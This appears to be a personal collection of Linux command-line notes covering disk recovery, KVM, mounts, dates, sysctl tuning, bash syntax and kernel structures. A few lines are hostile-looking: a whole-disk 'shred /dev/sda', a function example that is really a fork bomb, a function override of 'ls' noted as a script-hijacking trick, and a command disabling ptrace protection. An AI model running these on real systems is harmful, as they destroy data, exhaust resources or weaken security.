lsof /dev/sdc1

gpart: guess partition table. used for recovery

gddrescue: clone bad disk
partimage: clone disks, does not support ext4, don't use
fsarchiver: support ext4, use this instead of partimage

lost+found: store files whose actual locations cannot be determined
lost+found: store recovered bits of corrupted files.
during a filesystem consistency check.
details:
fsck might find data that looks like a complete file but doesn't have a name on the system — an
inode with no corresponding file name. This data is still using up space, but it isn't accessible by
any normal means.
--
For example, if you abruptly shut your computer down while it’s running and files are being written
to the hard drive, the fsck tool may automatically examine your file system the next time you boot
your computer. If it finds any corrupted data, it places it in the file system’s lost+found folder.

recover deleted files:
unmount the partition (go to single user mode if necessary)
need to know what you're looking for, do a grep on the device:
grep -a -B10 -A100 -i <pattern> /dev/sda2 > file.out
#-a: treat the device as a series of ascii char

shred: overwrite a file with random data, can be used on devices too:
shred -n 3 -vz /dev/sda
shred -zvu tecmint.pdf
# -z: adds a final overwrite with zeros to hide shredding.
# -u: helps to truncate and remove file after overwriting.
# -v: verbose

autopsy - graphical interface to SleuthKit
sleuthkit - tools for forensics analysis on volume and filesystem data

#burn cd/dvd
growisofs (preferred?)
example: growisofs -dvd-compat -Z /dev/sr0=isoimage.iso
wodim

#mounting an ISO image
mount -t iso9660 -o ro,loop /path/to/file.iso /mount-point

isosize : show the size of an iso9660 filesystem

mountpoint: check whether a directory is a mount point

extended attributes are name/value pairs associated with a file. a form of metadata
need to configure kernel: FS_XATTR
need to configure fstab
applications: attr, getfattr, setfattr

/etc/default/console-setup
#change console font:
dpkg-reconfigure console-setup #this will change /etc/default/console-setup
then run setupcon in virtual console
the fonts are in: /usr/share/consolefonts/
setfont Uni2-TerminusBold24x12
in /etc/default/console-setup:
FONTFACE="TerminusBold"
FONTSIZE="12x24"
=============
The font size is specified by 2 numbers in pixels represented as HEIGHT x WIDTH. If the width is 8
pixels, then only the height is specified. For comparison purposes, the default console font size is
16 (that is, 16 x 8).
-----
showconsolefont

tune2fs : adjust filesystem parameters
#list content of superblock, etc
tune2fs -l /dev/sda6
#set label
tune2fs -L <label> /dev/sda6
#similar to
dumpe2fs -h /dev/sda6
=====
tune2fs:  -m reserved-blocks-percentage (defaul: 5)
#reduces the reserved area to 2% of the filesystem, which may be more
tune2fs -m 2 /dev/sda1
#sets the filesystem to have no reserved blocks,
tune2fs -r 0 /dev/sda1

partprobe - inform the OS of partition table changes

DRM (direct rendering manager): a subsystem of the kernel responsible for
interfacing with GPU of video cards.
each GPU is a DRM device: /dev/dri/card0
DRM interface with GPU and graphics RAM
KMS interface with display controller, which interface with monitor screen

linux framebuffer: fbdev , /dev/fb0
allow access to graphics hardware through an API
The Linux framebuffer (fbdev) is a graphic hardware-independent abstraction layer to show graphics on a computer monitor, typically on the console.

Text mode is a computer display mode in which content is internally represented on a computer screen
in terms of characters rather than individual pixels.

restart X server:
#1: crude: kill -USR2 <pid of x server>
#2: better: systemctl restart lightdm

#length of command line

The limit for the length of a command line is not imposed by the shell, but by the operating
system. POSIX denotes this limit ARG_MAX and on POSIX conformant systems you can query it with
$ getconf ARG_MAX
====
According to POSIX: http://pubs.opengroup.org/onlinepubs/009695399/basedefs/limits.h.html
Maximum length of argument to the exec functions. This means: Without calling exec, there is no
ARG_MAX limitation. So it would explain why shell builtins are not restricted by ARG_MAX.

===== curl post with file =====
curl -F "data=@post.data"
the string looks like this:
--------------------------73e6530ff229c469
Content-Disposition: form-data; name="data"; filename="post.data"
Content-Type: application/octet-stream

{"rels": [{"from_vsid": "KTX1-OBU-099-South-HKG01-1", "to_vsid": "PHKG-7JY-057-North-GUX02-1", "rel_type": "TERMINALTRANSFERLEG_HOT"}]}

--------------------------73e6530ff229c469--
===========================

kvm daemon: libvirt-bin, libvirt-guests
== need to do this:
sudo systemctl start libvirtd virtlogd.service
kvm-ok #sanity check
virsh -c qemu:///system list
OR
virsh -c qemu:///system list --all
OR
virsh list --all
#the name column of virsh list is the domain name
===
default location of kvm images: /var/lib/libvirt/images
=== customize image location:
/etc/libvirt/storage/default.xml (use virsh pool-edit default)
--- storage pool
virsh pool-dumpxml default
virsh pool-edit default
virsh pool-list --all
virsh pool-info default
virsh pool-destroy domain
virsh pool-undefine domain
-----
change default location for images:
1. virsh pool-edit default
2. systemctl restart libvirtd
3. virsh pool-dumpxml default #to confirm
====
GUI : virt-manager
----
dump domain info: virsh dumpxml <domain-name>
----
virsh list --with-managed-save --all
virsh list --without-managed-save --all
virsh start foo --console
virsh reboot foo
virsh shutdown foo
virsh suspend foo
virsh resume foo
virsh console foo
virsh edit foo
virsh define foo
virsh snapshot-list foo
virsh ttyconsole foo
==== to delete VM
virsh destroy foo #domain needs to be running
virsh undefine foo
#delete the image manually (<domain-name>.qcow2)
----
for undefine: You can also specify --managed-save to delete any managed save images and --snapshots-metadata to
remove snapshots for the specified VM.
----
after move images:
virsh edit domainID
change: <source file='/mnt/raid/images/rh-5.5.qcow2'/>
===
arch linux: change KVM config:
video mode was qxl, change to virtio
===
virsh net-list --all
virsh net-dumpxml default

in /boot/grub/grub.cfg : add console=ttyS0 in guest VM
then you can "virsh console foo"

================================

bind mount: remount part of a file hierarchy elsewhere: mount --bind olddir newdir
after this, the same contents are available in two places.
===
if there are mount points under olddir, their contents are not visible under newdir unless use --rbind
use mount --rbind olddir newdir #replicate mount points under olddir
=== BEST:
A bind mount is an alternate view of a directory tree.
bind mount provides a view of a directory tree at a different location.
====
Classically, mounting creates a view of a storage device as a directory tree. A bind mount instead
takes an existing directory tree and replicates it under a different point. The directories and
files in the bind mount are the same as the original. Any modification on one side is immediately
reflected on the other side, since the two views show the same data.
=========
The alternative (classic) way to create a read-only bind mount is to use remount operation, for example:
mount --bind olddir newdir
mount -o remount,ro,bind olddir newdir
========================
when you mount a filesystem on a directory, this hides what is behind the directory. The files
in the directory become inaccessible until the directory is unmounted.
========
filesystem: a collection of files and directories in a hierarchy.
mounting: adding a filesystem to the global namespace of files and directories

Filesystem in Userspace (FUSE) is a software interface for Unix-like computer operating systems that
lets non-privileged users create their own file systems without editing kernel code. This is
achieved by running file system code in user space while the FUSE module provides only a "bridge" to
the actual kernel interfaces.

espeak : software speech synthesizer

segments of a program:
text segment: contain the executable code and read-only data
initialized data segment: contain initialized data
uninitialized data segment (bss): contain uninitialized data
stack segment

connect android to usb port: use MTP
mount point: /run/user/<userid>/gvfs

demand load executables: only those parts of a program required for execution are loaded into memory.
when a new process is created using fork(), memory is not requested, but instead the memory
for the parent process is used jointly by both processes. if the new process accesses part of the
memory in write mode, this section is copied before being modified: copy-on-write

/dev/mem is a character device file that is an image of the main memory of the computer.

blockdev --getss #sector size
blockdev --getbsz #block size

TZ=UTC date # get a date in UTC or: date -u
#convert epoch second to a date in UTC
TZ=UTC date --date=@1452832200
#convert epoch second to a date in UTC (ISO format)
TZ=UTC date --date=@1452832200 +%Y-%m-%dT%H:%M:%S.000Z
output: 2016-01-15T04:30:00.000Z
#convert date to epoch second
TZ=UTC date --date="2015-08-31 13:30:15" +%s
#past date
date --date='2 days ago'
#future date
date --date='2 days'
== get time in milliseconds
date +%s%3N

getconf PAGESIZE #get page size

pcmanfm --desktop-pref

setxkbmap: set keyboard using X extension
setxkbmap -print -verbose 10

lxpanelctl : (menu/run/config/restart)

scrot -cu -d 5

gnome-system-monitor


There are three different kinds of buffering strategies:
Characters written to or read from an unbuffered stream are transmitted individually to or from the file as soon as possible.
Characters written to a line buffered stream are transmitted to the file in blocks when a newline character is encountered.
Characters written to or read from a fully buffered stream are transmitted to or from the file in blocks of arbitrary size.
===
Newly opened streams are normally fully buffered, with one exception: a stream connected to an
interactive device such as a terminal is initially line buffered.
===
The use of line buffering for interactive devices implies that output messages ending in a newline
will appear immediately—which is usually what you want. Output that doesn’t end in a newline might
or might not show up immediately, so if you want them to appear immediately, you should flush
buffered output explicitly with fflush.
===
stdin : always buffered
stderr: always unbuffered
stdout: if terminal, then line-buffered, else unbuffered

stdbuf: modify buffering operations for streams
example: tail -f file | cut -d ' ' -f1 | uniq
nothing because the output of cut is buffered

tail -f access.log | stdbuf -oL cut -d ' ' -f1 | uniq
#use stdbuf -o0 if the data is not line-oriented
this will disable output buffering for the cut program

logical volume: a filesystem that appears to be a single physical volume,
but is actually assembled from space that has been allocated on multiple
physical partitions.

linux process and thread=======
process descriptor: struct task_struct
	pid_t pid; // this is the thread id
	pid_t tgid; // this is the process id

when a new process is created, it appears as a thread where both the PID and TGID are the same (new)
number.
When a thread starts another thread, that started thread gets its own PID (so the scheduler can
schedule it independently) but it inherits the TGID from the original thread.
====
getpid() returns tgid
gettid() returns pid
==========================

bash testing:
[ "$VAR" ] is equivalent to [ -n "$VAR" ] # true if not empty

power management tool: tlp, powertop

cpufrequtils (package): cpufreq-info command

core dump setting:
ulimit -c
cat /proc/sys/kernel/core_pattern
---
sysctl:
kernel.core_pattern = |/usr/lib/corekeeper/dump %d %u %p-%u-%g-%s-%t-%h-%E.core
kernel.core_pipe_limit = 0
kernel.core_uses_pid = 1

gcore - Generate a core file of a running program

useful commands from moreutils:
combine, errno, ifdata, isutf8, sponge, ts, vidir, vipe, zrun
===
example: sort myfile.txt | sponge myfile.txt

nice -n 19 <program>
renice -n 19 <pid>
ionice -c 3 cp bigfile.mp4 backup.mp4

take a screen shot of a video at 5:12 into the video
mplayer -vo png -ss 5:12 -frames 1 my-video.mp4

hide your processes from other users:
after this command, only my processes are under /proc
$ mount -o remount /proc -o hidepid=2

get location of IP address
curl ipinfo.io/216.58.192.4

mplayer -vo aa MovieName.avi #black and white
mplayer -vo caca MovieName.avi #color
====
exif image_name.jpg
====
mp3info music_file.mp3
====
convert original.jpg -resize 50% -quality 95 smaller.jpg #shrink by 50%
convert original.jpg -resize 200% -quality 95 bigger.jpg #enlarge
convert ships.jpg -rotate 30 tilt-ships.jpg #rotate
convert ships.jpg -background none -rotate 90 turn-ships.jpg #rotate
== make a banner
convert -background white -fill blue -font Courier -pointsize 32 label:'Happy Birthday' banner.jpg
== read text from a file
convert -background white -fill black -font Courier -pointsize 12 label:@message.txt banner.gif
== save command output to an image
ifconfig | convert label:@- myipaddress.png
== save command output to an existing image and create a new image
convert -font -misc-fixed-*-*-*-*-*-*-*-*-*-*-*-* -fill black -draw "text 270,260 \" `ip addr` \"" Linux.jpg myipaddress.jpg

record your desktop session (video)
# -s : resolution, alternative: -s 1024x768
ffmpeg -f x11grab -s wxga -r 25 -i :0.0 -sameq ~/my_video.mpg
## cut video
ffmpeg -i in.mp4 -ss [start] -t [duration] -c copy out.mp4
OR
ffmpeg -i in.mp4 -ss [start] -to [stop] -c copy out.mp4

# print sensors info
sensors

cgroups (control groups): allow you to set limits on resources for processes and their children.

mount namespace: make it look like you have the entire filesystem namespace
UTS (unix time sharing) namespace: make it look like you have your own hostname and domain name.
IPC namespace: you have your own message queues
PID namespace: you have your own process ID
network namespace: you have your own network devices
user namespace: you have your own user id

apparmor: kernel enhancement to confine programs to a limited set of resources
program: apparmor_status

#show networking info
networkctl list
network-admin

iwconfig : configure wireless network interface

chvt # change virtual console, has to run inside text-based virtual console

#capture screenshot
import -display :0.0 -window root sshot1.png

alias dos2unix='recode dos/CR-LF..l1'
alias unix2dos='recode l1..dos/CR-LF'
alias unix2win='recode l1..windows-1250'

#turn off ping replies
sysctl -w net.ipv4.icmp_echo_ignore_all=1
#slow down ping reply rate
sysctl -w net.ipv4.icmp_echoreply_rate=10

#lxterminal icons
/usr/share/icons/Lubuntu/apps/22/lxterminal.svg
/usr/share/icons/Lubuntu/apps/48/lxterminal.svg
/usr/share/icons/Lubuntu/apps/16/lxterminal.svg
/usr/share/icons/Lubuntu/apps/24/lxterminal.svg

#silence the beep
setterm -blength 0

By default, Linux uses the atime option on a disk mount, which means it writes a timestamp (e.g. a
write to the drive) every time it reads anything. So in this case, reads cause writes – and also
disk seeks, because a read from a file will then trigger having to write to the directory that
contains the file. This even occurs if a file is read from the file system’s page cache (reading
from the machine’s memory rather than the drive).
====
you can use the relatime option instead, which only writes a timestamp
when a file or directory is written to.
==
as of kernel 2.6.30, relatime is the default

#temporary filesystem
mkdir /ramdisk
mount none -t tmpfs -o size=256M /ramdisk

ss : display socket info
arping: send ARP request to a neighbor: arping -I eth0 192.188.1.1
ethtool

/sys/class/leds/<name>/trigger

modinfo radeon | grep description

#get module parameters
/sys/module/<mod_name>/parameters

#sort the output while keeping the header at the top
df -hP | awk 'NR==1;NR>1{print|"sort -k5rn"}'

nsswitch.conf - Name Service Switch configuration file
determine the order in which various name resolution services will be tried
--
getent : get entries from the name service switch library
getent hosts

GConf: store configuration settings. similar to Windows registry. deprecated.
GConf: to be replaced by GSettings and dconf
===
dconf is a low-level configuration system. Its main purpose is to provide a backend to GSettings on
platforms that don't already have configuration storage systems.
---
Gsettings is a development library used to read and write to a configuration store backend. On
Linux, it uses Dconf, but on Windows, it uses the registry, and on OS X, it uses a native data
store.
-- bottom line: don't use dconf directly. use GSettings
gsettings list-schemas
gsettings list-recursively #list all the keys
#after you find the schema, org.gnome.GWeather is a schema name
gsettings list-keys org.gnome.GWeather
#compare to following
gsettings list-recursively  | grep org.gnome.GWeather
#get the value of a key
gsettings get org.gnome.GWeather default-location
---
GUI: dconf-editor

#list files that do not match a pattern
ls !(one)
ls !(one|two)

isoinfo -i <iso-file> -l #list content
isoinfo -i <iso-file> -x <file> #extract file

time zone:
ln -s /usr/share/zoneinfo/America/Los_Angeles /etc/localtime

hwclock --systohc #generate the /etc/adjtime file
-- when setting hwclock, need to indicate wheter --utc or --localtime
hwclock --debug #can show whether hw clock is in local time or UTC
3rd line of /etc/adjtime: indicate whether hw clock is in local time or UTC

edit locale info in /etc/locale.gen, then run command locale-gen

hostnamectl status
hostnamectl set-hostname myhostname

nroff and troff are UNIX commands (and the utilities that support them) for formatting text files
for printing. nroff is designed for formatting output for line printers and letter-quality
printers. troff is designed for formatting output for typesetters. troff contains some special
functions that apply only to typesetters; otherwise, the commands are identical and either can be
used.
===
Groff is the GNU replacement for the troff and nroff text formatters.

kbd_mode : report/set keyboard mode of console
kbdrate: set keyboard repeat and delay time
kbdinfo: obtain info about console
kbdinfo getmode: text/graphics
kbdinfo gkbmode: unicode
kbdinfo gkbled: scrolllock, numlock, capslock
unicode_start : put keyboard and console in unicode mode
---
keymap: the mapping between the key pressed and the characer used by the computer

console: console is in utf8 mode, so program output is utf8 (8-bit values)
a translation table maps 8-bit values to 16-bit unicode values. such translation table
is called unicode console map. the kernel then uses the 16-bit unicode value to choose
the right glyph from the font file and display it.
setfont -m : used to specify a unicode console map
===
font file also contains Unicode mapping table, which maps a Unicode value to each glyph
setfont -u : used to specify a unicode mapping table

localectl status
localectl list-keymaps
localectl list-locales

for virtual console: keyboard translation table commands: dumpkeys, loadkeys, showkey
--
dumpkeys > backup.kmap #save current keymap
loadkeys backup.kmap #restore keymap
showkey #check which key code is assigned

brctl show : show ethernet bridge

/etc/securetty

The configuration file for DNS resolvers is /etc/resolv.conf
The resolver is a set of routines in the C library that provide access to the Internet Domain Name
System (DNS).

A Linux system actually has two clocks: One is the battery powered "Real Time Clock" (also known as
the "RTC", "CMOS clock", or "Hardware clock") which keeps track of time when the system is turned
off but is not used when the system is running. The other is the "system clock" (sometimes called
the "kernel clock" or "software clock") which is a software counter based on the timer interrupt. It
does not exist when the system is not running, so it has to be initialized from the RTC (or some
other time source) at boot time. References to "the clock" in the ntpd documentation refer to the
system clock, not the RTC.

ntp -p : show NTP status
ntptime

network bridge: sw/hw that combines two or more network segments. it behaves like
a virtual netowkr switch.
bridge is a way to connect two Ethernet segments in a protocol-independent way. packets are
forwarded based on Ethernet address, rather than IP address.

/etc/default/rcS: UTC=no/yes #assume real-time clock in UTC or not
/etc/default/rcS: variables that affect the behavior of boot scripts

tzselect : select time zones interactively

hardware clock (aka real time clock, RTC)
by default, Windows think RTC is in local time.
This can be changed in the registry:
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TimeZoneInformation]
"RealTimeIsUniversal"=dword:00000001
== make following changes in home laptop:
1. check BIOS time
2. Windows: change registry
3. boot, set BIOS time to UTC
4. boot into Windows, verify time
5. reboot, check BIOS time
6. boot into Windows, verify time again
7. reboot, check BIOS time again
8. then reboot from USB/CD (linux)
9. mount /dev/sdaX, change /etc/default/rcS (UTC=yes) and /etc/adjtime (change LOCAL to UTC)
10. boot into Linux, verify time
11. reboot, check BIOS time, go to Linux, verify time again
=====
write UTC to RTC (hwclock --systohc --utc)
== window time service?
windows: sc config w32time start=disabled/demand ??

Linux : 11 minute mode: CONFIG_GENERIC_CMOS_UPDATE compiler option
the kernel copies the system time to the hardware clock every 11 minutes
this mode is useful when NTP is running

POSIX character classes
[:upper:]	[A-Z]	uppercase letters
[:lower:]	[a-z]	lowercase letters
[:alpha:]	[A-Za-z]	upper- and lowercase letters
[:digit:]	[0-9]	digits
[:xdigit:]	[0-9A-Fa-f]	hexadecimal digits
[:alnum:]	[A-Za-z0-9]	digits, upper- and lowercase letters
[:punct:]		punctuation (all graphic characters except letters and digits)
[:blank:]	[ \t]	space and TAB characters only
[:space:]	[ \t\n\r\f\v]	blank (whitespace) characters
[:cntrl:]		control characters
[:graph:]	[^ [:cntrl:]]	graphic characters (all characters which have graphic representation)
[:print:]	[[:graph] ]	graphic characters and space

os-prober
linux-boot-prober /dev/sda8

rmmod pcspkr #disable PC speaker

setterm : set terminal attribute

127.0.1.1: the purpose is to assign an IP to a host name in the absence of a network
connection. If the machine has a permanent IP address, use it instead of 127.0.1.1

resize partition:
checking: e2fsck -f /dev/sda1, dumpe2fs -h /dev/sda1
enlarge: extend partition, then resize file system
shrink:
resize filesystem: resize2fs /dev/sda1 1000s # 1000s specify 1000 sectors
afterwards, run e2fsck and dumpe2fs to check
shrink partion: use parted:
resizepart 1 10547s #1 is partition number and 10547s is the ending sector:
afterwards:
/dev/sdb1        2048 10547    8500  4.2M 83 Linux
==
afterwards, run blkid to check partition UUID

scrollback buffer: between video adapter and the display device
change scrollback buffer size: provide fbcon=scrollback:Nk where N is the buffer size
in kilobytes. default is 32k. (http://www.kernel.org/doc/Documentation/fb/fbcon.txt)

search with locate:
1. locate --basename '\pkg'
output: /usr/src/linux-headers-4.8.0-26-generic/include/config/x86/pkg
2. locate --basename 'pkg'
output: a lot, such as /var/log/dpkg.log
conclusion: 'pkg' means '*pkg*'
upshot: Where \ is a globbing character, it disables the implicit replacement of pkg by *pkg*.

import : saves any visible window on an X server and outputs it as an image file. You can capture a
       single window, the entire screen, or any rectangular portion of the screen.
example: import -window emacs5 test.jpg

restart frozen system (not tested):
Press ALT + PrntScrn and then, while holding those, type the following letters in order: REISUB.

/etc/rc.local : executed on reboot

top/htop process states:
R    running or runnable (on run queue)
S    interruptible sleep (waiting for an event to complete)
D    uninterruptible sleep (usually IO)
Z    defunct ("zombie") process, terminated but not reaped by its parent
T    stopped by job control signal
t    stopped by debugger during the tracing
X    dead (should never be seen)
===
memory usage:
VIRT/VSZ :
The total amount of virtual memory used by the task. It includes all code, data and shared libraries
plus pages that have been swapped out and pages that have been mapped but not used.
If an application requests 1 GB of memory but uses only 1 MB, then VIRT will report 1 GB. not very useful.
---
RES/RSS: is the portion of memory occupied by a process that is held in main memory (RAM).
non-swapped physical memory used by a process. does not include the swapped out memory.
some of the memory may be shared with other processes.
If a process uses 1 GB of memory and it calls fork(), the result of forking will be two processes
whose RES is both 1 GB but only 1 GB will actually be used since Linux uses copy-on-write.
---
SHR: The amount of shared memory used by a task.
---
MEM% : A task's currently used share of available physical memory.

line discipline: cat /proc/tty/ldiscs
cat /proc/tty/drivers

ldattach: attach a line discipline to a serial line

A line discipline (LDISC) is a layer in the terminal subsystem in some Unix-like systems. The
terminal subsystem consists of three layers: the upper layer to provide the character device
interface, the lower hardware driver to communicate with the hardware or pseudo terminal, and the
middle line discipline to specify a policy for the driver.
---
line discipline does input processing in the kernel (provide line editing)

tty: (stty -a)
canonical mode: icanon (input characters are assembled into lines)
icrnl (translate CR to newline)
-igncr : don't ignore CR
====
serial port terminal: /dev/ttySn
pseudo terminal: /dev/pty
controlling terminal: /dev/tty
console: /dev/ttyn, /dev/console

EDID: /sys/class/drm/*/edid
EDID program: sudo get-edid | parse-edid
sample output:
Section "Monitor"
        Identifier "DELL P2411H"
        ModelName "DELL P2411H"
        VendorName "DEL"
        # Monitor Manufactured week 22 of 2011
        # EDID version 1.3
        # Analog Display
        Option "SyncOnGreen" "true"
        DisplaySize 530 300
        Gamma 2.20
        Option "DPMS" "true"
        Horizsync 30-83
        VertRefresh 56-76
        # Maximum pixel clock is 170MHz
        #Not giving standard mode: 1152x864, 75Hz
        #Not giving standard mode: 1280x1024, 60Hz
        #Not giving standard mode: 1920x1080, 60Hz
        Modeline        "Mode 0" 148.50 1920 2008 2052 2200 1080 1084 1089 1125 +hsync +vsync
EndSection

sudo hwinfo --monitor will list the graphics modes supported by the monitor. also detailed info about monitor
sudo hwinfo --framebuffer will list the graphics modes supported by the computer.

a Snap app is self-contained package that includes all of the dependencies and libraries that an
application needs to run. These apps are sandboxed, install to their own directory, and can’t touch,
see or otherwise 'interface' with the rest of your system without your permission.

find broken symbolic links:
find . -type l -! -exec test -e {} \; -print

dump man pages:
man man | col -b  > file.txt # col -b: remove backspaces

blacklisting on kernel command line: modprobe.blacklist=modulename

change sudo timeout session:
#1. edit file: sudo visudo
#2. add this line:
Defaults        env_reset,timestamp_timeout=20 #20 minutes
#if 0, timeout right away, if -1, disable password prompt

kill: If sig is 0, then no signal is sent, but error checking is still performed.

#system info tool
inxi --recommends #check system
inxi #without argument
inxi -S #system
inxi -M #machine
inxi -C #cpu
inxi -G #graphics
inxi -A #audio
inxi -N #network
inxi -D #hard disk
inxi -b #summary
inxi -p #partition
inxi -F #full info

bash -n #check syntax without running

laptop battery checking: acpi

curl ifconfig.me #get your IP address from the viewpoint of others on the internet

getopts
example: ${OPTIND} is equal to 1 , ${!OPTIND} is equal to the value of the first argument

sysctl -w net.core.netdev_max_backlog=16384
sysctl -w net.ipv4.tcp_max_syn_backlog=8192
sysctl -w net.ipv4.tcp_syncookies=1
sysctl -w net.core.rmem_max=16777216
sysctl -w net.core.wmem_max=16777216
sysctl -w net.ipv4.tcp_rmem="4096 87380 16777216"
sysctl -w net.ipv4.tcp_wmem="4096 16384 16777216"
sysctl -w net.ipv4.ip_local_port_range="1024 65535"
sysctl -w net.ipv4.tcp_tw_recycle=1
sysctl net.ipv4.tcp_available_congestion_control

/etc/security/limits.conf:
theusername		hard nofile	40000
theusername		soft nofile	40000

/etc/securetty : specify where root user can log on
chage: change password expiry info (password aging)

Tripwire: Intrusion Detection

httpie example:
#1. send json data
http POST URL name=blah
#2. see the request being sent: -v
http -v POST URL name=blah
#3. send header
http -v POST URL name=blah appcontext:cheok
#
http POST :2525 #assume localhost
#4. post from file
http POST url < file.json
#5. http -h #print only response header
#6. http -b #print only response body
-- curl equivalent:
curl -s -X POST --data '@/path/to/filename.json' URL
curl -s -X POST --data-binary '@/path/to/filename.json' URL
===
--timeout SECONDS, default is 30 sec

sed : extended regexp
--
The only difference between basic and extended regular expressions is in the behavior of a few
characters: ?, +, parentheses, and braces ({}). While basic regular expressions require these to be
escaped if you want them to behave as special characters, when using extended regular expressions
you must escape them if you want them to match a literal character.

#search only file that match a pattern
grep -r --include "*.py" <pattern>

wrk: a HTTP benchmarking tool
wrk -t3 -c1000 -d10s http://127.0.0.1:8080
#  3 threads and 1000 connections

/proc/modules                 displays a list of kernel loaded modules.
/proc/cmdline                   displays the parameters passed to the kernel when the system started.

/proc/sys/fs/file-max this entry specifies the maximum number of open files that Linux can support at any one time.

nproc #show number of processors
other commands: cpuid, hwinfo

samba: implements SMB/CIFS protocol and allows non-Windows machines to network with Windows machines.
SMB: a network file sharing protocol.

show routes:
ip r
route -n
routel
route -nee

monitoring tool: glances

tar cfv dv.tar.gz --exclude="*pycache*" dataVerification/

find out x org version:
xdpyinfo | grep "X.Org version"
OR
X -version

=== use telnet to connect to web server
$ telnet www.google.com 80
Trying 216.58.221.100...
Connected to www.google.com.
Escape character is '^]'.

GET / HTTP/1.1 #press return twice
===

bash: define function syntax: last thing in function definition must be ; or &
* must have a space between { and command
wow(){ wow|wow & }
ano(){ echo hi; }

On Unix and Unix-like computer operating systems, a zombie process or defunct process is a process
that has completed execution (via the exit system call) but still has an entry in the process table:
it is a process in the "Terminated state". This occurs for child processes, where the entry is still
needed to allow the parent process to read its child's exit status: once the exit status is read via
the wait system call, the zombie's entry is removed from the process table and it is said to be
"reaped".

A semaphore is an integer whose value is never allowed to fall below zero. Two operations
can be performed on semaphores: increment the semaphore value by one (sem_post()); and decrement
the semaphore value by one (sem_wait()). If the value of a semaphore is currently zero, then a
sem_wait() operation will block until the value becomes greater than zero.
POSIX semaphores come in two forms: named semaphores and unnamed semaphores.

from: include/linux/semaphore.h:
===
struct semaphore {
        raw_spinlock_t          lock;
        unsigned int            count;
        struct list_head        wait_list;
};

from: include/linux/mutex.h:
struct mutex {
        /* 1: unlocked, 0: locked, negative: locked, possible waiters */
        atomic_t                count;
        spinlock_t              wait_lock;
        struct list_head        wait_list;
        struct task_struct      *owner;
        struct optimistic_spin_queue osq; /* Spinner MCS lock */
        void                    *magic;
        struct lockdep_map      dep_map;
};

from: include/linux/spinlock_types.h:
typedef struct raw_spinlock {
	arch_spinlock_t raw_lock;
	unsigned int break_lock;
	unsigned int magic, owner_cpu;
	void *owner;
	struct lockdep_map dep_map;
} raw_spinlock_t

ptrace: process trace
The ptrace() system call provides a means by which one process (the "tracer") may observe and
control the execution of another process (the "tracee"), and examine and change the tracee's memory
and registers.  It is primarily used to implement breakpoint debugging and system call tracing.
--
error: Can't attach to the process: ptrace(PTRACE_ATTACH, ..)
solution: echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
default value of /proc/sys/kernel/yama/ptrace_scope is 1
put a value of zero in /proc/sys/kernel/yama/ptrace_scope

#list files opened by a process
#1. ls /proc/<pid>/fd
#2. lsof -a -p <pid>

Aliases are not expanded when the shell is not interactive, unless the expand_aliases shell option
is set using shopt: shopt -s expand_aliases

Aliases are deprecated in favor of shell functions.
function xoo(){ xdg-open; }
export -f xoo #make function visible to script

cannot use external aliases in bash shell script, use functions instead
=== script ==
#!/bin/bash
ls
====
then do:
function ls(){ echo "hi cheok"; }
export -f ls
===
the script will execute the ls function
lesson: script will execute function first. attackers can make scripts do something else.
script should use absolute path to commands.

== class test command ==
-a <FILE>	True if <FILE> exists. (not recommended, may collide with -a for AND, see below)
-e <FILE>	True if <FILE> exists.
-f <FILE>	True, if <FILE> exists and is a regular file.
-d <FILE>	True, if <FILE> exists and is a directory.
-c <FILE>	True, if <FILE> exists and is a character special file.
-b <FILE>	True, if <FILE> exists and is a block special file.
-p <FILE>	True, if <FILE> exists and is a named pipe (FIFO).
-S <FILE>	True, if <FILE> exists and is a socket file.
-L <FILE>	True, if <FILE> exists and is a symbolic link.
-h <FILE>	True, if <FILE> exists and is a symbolic link.
-g <FILE>	True, if <FILE> exists and has sgid bit set.
-u <FILE>	True, if <FILE> exists and has suid bit set.
-r <FILE>	True, if <FILE> exists and is readable.
-w <FILE>	True, if <FILE> exists and is writable.
-x <FILE>	True, if <FILE> exists and is executable.
-s <FILE>	True, if <FILE> exists and has size bigger than 0 (not empty).
-t <fd>	True, if file descriptor <fd> is open and refers to a terminal.
<FILE1> -nt <FILE2>	True, if <FILE1> is newer than <FILE2> (mtime).
<FILE1> -ot <FILE2>	True, if <FILE1> is older than <FILE2> (mtime).
<FILE1> -ef <FILE2>	True, if <FILE1> and <FILE2> refer to the same device and inode numbers.
===
-z <STRING>	True, if <STRING> is empty.
-n <STRING>	True, if <STRING> is not empty (this is the default operation).
<STRING1> = <STRING2>	True, if the strings are equal.
<STRING1> != <STRING2>	True, if the strings are not equal.
<STRING1> < <STRING2>	True if <STRING1> sorts before <STRING2> lexicographically (pure ASCII, not current locale!).
                        Remember to escape! Use \<
<STRING1> > <STRING2>	True if <STRING1> sorts after <STRING2> lexicographically (pure ASCII, not current locale!).
                        Remember to escape! Use \>
==
<INTEGER1> -eq <INTEGER2>	True, if the integers are equal.
<INTEGER1> -ne <INTEGER2>	True, if the integers are NOT equal.
<INTEGER1> -le <INTEGER2>	True, if the first integer is less than or equal second one.
<INTEGER1> -ge <INTEGER2>	True, if the first integer is greater than or equal second one.
<INTEGER1> -lt <INTEGER2>	True, if the first integer is less than second one.
<INTEGER1> -gt <INTEGER2>	True, if the first integer is greater than second one.

sysdig: monitor user activity in real-time

copy with relative path
after operation, we have ~/wow/org/apache/maven/plugins/maven-install-plugin/2.4
#1. rsync -R
rsync -avR org/apache/maven/plugins/maven-install-plugin/2.4/* ~/wow
#2. cp --parents
cp --parents org/apache/maven/plugins/maven-install-plugin/2.4/* ~/wow
#3. tar
tar cf - org/apache/maven/plugins/maven-install-plugin/2.4 | tar xf - -C ~/wow

expr command:
expr length "cheok" #length of string
expr 6 / 4 #quotient
expr 6 % 4 #remainder
===
expr string : regexp
regexp has to match entire string
example:
#1. expr linux : lin    #return # of chars matched
return 3, exit status: 0
#2. expr linux : '\(lin\)' #print matched chars
return lin

#implement dirname as a function
function dirname(){ echo $1 | sed 's:\(.*\)/.*:\1:'; }

#current directory only
find . -maxdepth 1
find . -mindepth 1 #don't show current directory (.)
-mindepth 1 means process all files except the starting-points.

lslogins - display information about known users in the system
lastlog

LVM (logical volume manager) is a method of allocating hard drive space into logical volumes that
can be easily resized instead of partitions

# number the columns
head -1 ??.csv | tr "," "\n" | nl

#make column lists , or make a table
(printf "PERM LINKS OWNER GROUP SIZE MONTH DAY HH:MM/YEAR NAME\n" ; ls -l | sed 1d) | column -t

#replace the 2nd occurrence of a pattern
echo "this,is,just,a,test" | sed 's/,/ /2'


#this does not work, syntax error
